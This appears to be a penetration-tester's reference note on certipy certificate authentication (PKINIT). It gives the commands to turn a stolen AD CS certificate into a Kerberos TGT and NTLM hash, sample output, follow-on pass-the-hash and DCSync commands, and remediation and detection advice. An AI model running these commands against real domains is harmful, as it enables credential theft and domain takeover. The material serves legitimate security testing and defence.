# Certificate-Based Authentication (certipy auth)

**MITRE:** [T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)  
**Phase:** Credential Access  
**Auth Required:** Yes (valid .pfx certificate file)  
**Tags:** #credential-access #adcs #certificate #pkinit #kerberos

---

## Summary
Exchange a certificate (.pfx) for a Kerberos TGT and NTLM hash via PKINIT. Used after obtaining a certificate through ESC1, ESC8, or other AD CS attack paths. The resulting hash can be used for Pass-the-Hash, DCSync, or further lateral movement.

## Mechanism
- **Protocol:** Kerberos PKINIT (88/TCP)
- **RPC/Function:** AS-REQ with certificate pre-authentication
- **Effect:** DC validates the cert and issues a TGT + NTLM hash for the certificate's identity

## Commands

```bash
# Authenticate with certificate, get TGT + NTLM hash
certipy auth -pfx [certificate-file].pfx -dc-ip [dc-ip]

# If domain can't be inferred from the cert
certipy auth -pfx [certificate-file].pfx -dc-ip [dc-ip] -domain [domain]
```

## Expected Output
```
[*] Using principal: svc_scanner@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'svc_scanner.ccache'
[*] Trying to retrieve NT hash for 'svc_scanner'
[*] Got hash for 'svc_scanner@corp.local': aad3b435b51404eeaad3b435b51404ee:3a4b5c6d7e8f...
```

## Notes
- The `.ccache` file is a Kerberos credential cache — usable with `KRB5CCNAME=svc_scanner.ccache` for Kerberos-based tools
- The NTLM hash can be used directly for Pass-the-Hash without cracking
- Works for any identity the cert asserts — machine accounts, service accounts, Domain Admins

## Relay / Follow-On Attack Path
- NTLM hash → `nxc smb [host] -u [user] -H [hash]` → validate access level
- NTLM hash → `secretsdump.py '[domain]/[user]@[dc-ip]' -hashes ':[hash]'` → DCSync
- `.ccache` → set `KRB5CCNAME` → Kerberos-based lateral movement

## Remediation
- Root fix is upstream: prevent issuance of fraudulent certificates (ESC1/ESC8 remediation)
- Enable EPA on AD CS web enrollment (blocks ESC8 relay path)
- Restrict certificate template enrollment rights (blocks ESC1 path)
- Monitor EID 4768 (TGT requested) for anomalous machine account or service account Kerberos auth

## Related
- [[ttps/credential-access/adcs-esc1-san-impersonation]]
- [[tools/certipy]]
- [[playbooks/adcs-esc1-domain-admin]]
